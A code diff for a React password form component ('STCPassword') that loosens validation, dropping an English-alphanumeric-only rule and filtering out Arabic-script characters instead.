@@ -16,8 +16,7 @@ import { Lock } from "lucide-react";
 
 const schema = z.object({
   password: z.string()
-    .min(1, "كلمة المرور مطلوبة")
-    .regex(/^[a-zA-Z0-9]+$/, "كلمة المرور يجب أن تحتوي على أرقام وحروف إنجليزية فقط"),
+    .min(1, "كلمة المرور مطلوبة"),
 });
 
 type FormData = z.infer<typeof schema>;
@@ -113,7 +112,7 @@ export default function STCPassword() {
               dir="ltr"
               onInput={(e) => {
                 const input = e.target as HTMLInputElement;
-                input.value = input.value.replace(/[^a-zA-Z0-9]/g, '');
+                input.value = input.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF]/g, '');
               }}
               {...register("password")}
             />
